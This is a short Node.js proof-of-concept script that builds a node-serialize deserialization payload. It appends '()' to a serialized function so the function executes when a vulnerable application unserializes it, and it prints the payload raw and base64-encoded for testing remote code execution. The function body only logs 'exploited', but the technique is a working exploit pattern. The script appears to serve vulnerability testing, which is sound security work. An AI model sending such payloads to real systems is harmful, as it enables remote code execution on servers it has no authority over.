/**
 * Function to create a serialized payload for testing if the application is vulnerable to RCE using JSON deserialization
 * Specific to this PoC only
 */
const { serialize } = require("node-serialize");
const payload = {
  word: function () {
    console.log("exploited");
    return "SecureApp";
  },
};
console.log("<<<=====Serialized Payload=====>>>");
const serializedPayload = serialize(payload).slice(0, -2) + `()"}`;
console.log(serializedPayload);
console.log("<<<=====Base64 Encoded Payload=====>>>");
console.log(Buffer.from(serializedPayload).toString("base64"));
